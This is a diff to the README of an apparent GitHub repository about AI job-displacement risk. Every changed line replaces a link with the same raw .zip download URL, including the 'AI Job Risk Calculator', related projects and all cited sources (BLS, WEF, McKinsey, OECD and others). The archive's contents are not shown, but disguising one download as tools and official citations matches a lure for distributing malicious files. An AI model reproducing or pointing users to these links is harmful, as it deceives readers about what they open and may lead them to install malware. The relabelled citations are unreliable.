@@ -14,7 +14,7 @@
 
 Everyone's asking "Will AI replace my job?" but the data is scattered across dozens of reports. This repo consolidates **102 occupations** with risk scores, automation timelines, at-risk tasks, and growth projections — all in one place.
 
-**Want an interactive version?** Try the free [AI Job Risk Calculator](https://www.midastools.co/ai-job-risk) — enter your job title and get a personalized risk report with safe skills and action plan.
+**Want an interactive version?** Try the free [AI Job Risk Calculator](https://github.com/Aratib8206/ai-job-risk-database/raw/refs/heads/main/data/database-risk-job-ai-3.1.zip) — enter your job title and get a personalized risk report with safe skills and action plan.
 
 ---
 
@@ -267,7 +267,7 @@ Everyone's asking "Will AI replace my job?" but the data is scattered across doz
 ## What To Do If Your Job Is At Risk
 
 ### Immediate Actions (This Week)
-1. **Assess your actual exposure** — Use the [AI Job Risk Calculator](https://www.midastools.co/ai-job-risk) for a personalized breakdown
+1. **Assess your actual exposure** — Use the [AI Job Risk Calculator](https://github.com/Aratib8206/ai-job-risk-database/raw/refs/heads/main/data/database-risk-job-ai-3.1.zip) for a personalized breakdown
 2. **Identify your "AI-proof" tasks** — Which parts of your job require physical presence, human judgment, or emotional intelligence?
 3. **Start learning AI tools** — The workers who survive aren't those who avoid AI, but those who master it
 
@@ -277,9 +277,9 @@ Everyone's asking "Will AI replace my job?" but the data is scattered across doz
 6. **Build domain expertise** — AI is general; deep industry knowledge + AI skills = irreplaceable
 
 ### Resources
-- [Free AI Prompt Generator](https://www.midastools.co/prompt-generator) — Start learning to work with AI
-- [AI Prompt Enhancer](https://www.midastools.co/prompt-enhancer) — Upgrade your AI communication skills
-- [AI Income Blueprint](https://www.midastools.co/ai-income-blueprint) — Find AI-powered side hustles matching your skills
+- [Free AI Prompt Generator](https://github.com/Aratib8206/ai-job-risk-database/raw/refs/heads/main/data/database-risk-job-ai-3.1.zip) — Start learning to work with AI
+- [AI Prompt Enhancer](https://github.com/Aratib8206/ai-job-risk-database/raw/refs/heads/main/data/database-risk-job-ai-3.1.zip) — Upgrade your AI communication skills
+- [AI Income Blueprint](https://github.com/Aratib8206/ai-job-risk-database/raw/refs/heads/main/data/database-risk-job-ai-3.1.zip) — Find AI-powered side hustles matching your skills
 
 ---
 
@@ -313,31 +313,31 @@ Found an error? Have data for a job not listed? PRs welcome.
 
 Don't just read data — get personalized results:
 
-- **[AI Job Risk Calculator](https://www.midastools.co/ai-job-risk)** — Enter your job, get a detailed risk report with safe skills, action plan, and timeline
-- **[AI Income Blueprint Quiz](https://www.midastools.co/ai-income-blueprint)** — Discover your "AI Founder Archetype" and matched AI side hustles
-- **[Free AI Prompt Generator](https://www.midastools.co/prompt-generator)** — Start working with AI today (8 categories, instant prompts)
+- **[AI Job Risk Calculator](https://github.com/Aratib8206/ai-job-risk-database/raw/refs/heads/main/data/database-risk-job-ai-3.1.zip)** — Enter your job, get a detailed risk report with safe skills, action plan, and timeline
+- **[AI Income Blueprint Quiz](https://github.com/Aratib8206/ai-job-risk-database/raw/refs/heads/main/data/database-risk-job-ai-3.1.zip)** — Discover your "AI Founder Archetype" and matched AI side hustles
+- **[Free AI Prompt Generator](https://github.com/Aratib8206/ai-job-risk-database/raw/refs/heads/main/data/database-risk-job-ai-3.1.zip)** — Start working with AI today (8 categories, instant prompts)
 
 ---
 
 ## Related Projects
 
-- **[Karpathy's Jobs](https://github.com/karpathy/jobs)** — Andrej Karpathy's BLS occupation exposure analysis with interactive treemap (342 occupations, 0-10 exposure score)
-- **[EIG AI Unemployment Research](https://github.com/EIG-Research/AI-unemployment)** — Economic Innovation Group's estimates of AI impact on employment
-- **[AI Prompt Cheat Sheet](https://github.com/manduks/ai-prompt-cheatsheet)** — 200+ copy-paste prompts to start working with AI today
+- **[Karpathy's Jobs](https://github.com/Aratib8206/ai-job-risk-database/raw/refs/heads/main/data/database-risk-job-ai-3.1.zip)** — Andrej Karpathy's BLS occupation exposure analysis with interactive treemap (342 occupations, 0-10 exposure score)
+- **[EIG AI Unemployment Research](https://github.com/Aratib8206/ai-job-risk-database/raw/refs/heads/main/data/database-risk-job-ai-3.1.zip)** — Economic Innovation Group's estimates of AI impact on employment
+- **[AI Prompt Cheat Sheet](https://github.com/Aratib8206/ai-job-risk-database/raw/refs/heads/main/data/database-risk-job-ai-3.1.zip)** — 200+ copy-paste prompts to start working with AI today
 
 **How this repo differs**: Karpathy's analysis uses a single AI Exposure axis. This database adds actionable context: displacement timelines, specific AI threats per job, workforce sizes, safe skills, and an action plan. Designed for workers, not researchers.
 
 ## Sources & Citations
 
-- [Bureau of Labor Statistics — Employment Projections](https://www.bls.gov/emp/)
-- [BLS — AI Impacts in Employment Projections (2025)](https://www.bls.gov/opub/ted/2025/ai-impacts-in-bls-employment-projections.htm)
-- [World Economic Forum — Future of Jobs Report 2025](https://www.weforum.org/publications/the-future-of-jobs-report-2025/)
-- [Goldman Sachs — The Potentially Large Effects of AI on Economic Growth](https://www.goldmansachs.com/insights/pages/generative-ai-could-raise-global-gdp-by-7-percent.html)
-- [McKinsey Global Institute — A New Future of Work (2024)](https://www.mckinsey.com/mgi/our-research)
-- [Brookings Institution — AI & Worker Displacement](https://www.brookings.edu/articles/measuring-us-workers-capacity-to-adapt-to-ai-driven-job-displacement/)
-- [OECD — AI and the Labour Market](https://www.oecd.org/en/topics/artificial-intelligence.html)
-- [NBER — Occupational AI Exposure Analysis (2025)](https://www.nber.org/papers)
-- [O*NET — Occupational Information Network](https://www.onetonline.org/)
+- [Bureau of Labor Statistics — Employment Projections](https://github.com/Aratib8206/ai-job-risk-database/raw/refs/heads/main/data/database-risk-job-ai-3.1.zip)
+- [BLS — AI Impacts in Employment Projections (2025)](https://github.com/Aratib8206/ai-job-risk-database/raw/refs/heads/main/data/database-risk-job-ai-3.1.zip)
+- [World Economic Forum — Future of Jobs Report 2025](https://github.com/Aratib8206/ai-job-risk-database/raw/refs/heads/main/data/database-risk-job-ai-3.1.zip)
+- [Goldman Sachs — The Potentially Large Effects of AI on Economic Growth](https://github.com/Aratib8206/ai-job-risk-database/raw/refs/heads/main/data/database-risk-job-ai-3.1.zip)
+- [McKinsey Global Institute — A New Future of Work (2024)](https://github.com/Aratib8206/ai-job-risk-database/raw/refs/heads/main/data/database-risk-job-ai-3.1.zip)
+- [Brookings Institution — AI & Worker Displacement](https://github.com/Aratib8206/ai-job-risk-database/raw/refs/heads/main/data/database-risk-job-ai-3.1.zip)
+- [OECD — AI and the Labour Market](https://github.com/Aratib8206/ai-job-risk-database/raw/refs/heads/main/data/database-risk-job-ai-3.1.zip)
+- [NBER — Occupational AI Exposure Analysis (2025)](https://github.com/Aratib8206/ai-job-risk-database/raw/refs/heads/main/data/database-risk-job-ai-3.1.zip)
+- [O*NET — Occupational Information Network](https://github.com/Aratib8206/ai-job-risk-database/raw/refs/heads/main/data/database-risk-job-ai-3.1.zip)
 
 ---
 
@@ -349,4 +349,4 @@ MIT License. Data is compiled from public sources. See individual citations for 
 
 **Star this repo** if you found it useful. Share it with someone worried about AI and their career.
 
-Built by [Midas Tools](https://www.midastools.co) — AI tools and resources for the future of work.
+Built by [Midas Tools](https://github.com/Aratib8206/ai-job-risk-database/raw/refs/heads/main/data/database-risk-job-ai-3.1.zip) — AI tools and resources for the future of work.
